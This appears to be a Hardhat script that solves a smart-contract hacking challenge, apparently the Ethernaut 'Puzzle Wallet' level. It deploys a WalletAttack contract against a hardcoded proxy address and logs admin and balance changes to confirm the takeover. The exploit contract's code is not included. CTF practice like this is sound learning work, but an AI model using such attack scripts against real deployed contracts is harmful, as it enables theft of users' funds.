// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function createInstance(player) {
    // for local test
    const PuzzleWalletFactory = await hre.ethers.getContractFactory("PuzzleWalletFactory");
    factory = await PuzzleWalletFactory.deploy();
    await factory.deployed();

    tx = await factory.createInstance(player.address, {value: ethers.utils.parseEther("0.001")})
    await tx.wait()

    return (await factory.lastInstance());
}

async function main() {
    INSTANCE_ADDRESS = '0xc70Ec8494F5e1c15650D9F19C7668ACF91b0c94d';
    const [owner, player] = await ethers.getSigners();

    const PuzzleProxy = await hre.ethers.getContractFactory("PuzzleProxy");
    const PuzzleWallet = await hre.ethers.getContractFactory("PuzzleWallet");
    proxy = PuzzleProxy.attach(INSTANCE_ADDRESS);
    wallet = PuzzleWallet.attach(INSTANCE_ADDRESS);

    console.log(await proxy.admin());
    console.log(await ethers.provider.getBalance(proxy.address));

    WalletAttack = await hre.ethers.getContractFactory("WalletAttack");
    const attack = await WalletAttack.deploy(INSTANCE_ADDRESS, {value: ethers.utils.parseEther("0.001")})
    await attack.deployed();

    console.log(`attack ${attack.address}`);
    console.log(await proxy.pendingAdmin());
    console.log(await wallet.whitelisted(attack.address));
    console.log(await ethers.provider.getBalance(attack.address));
    console.log(await ethers.provider.getBalance(proxy.address));
    console.log(await proxy.admin());
    console.log(owner.address);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
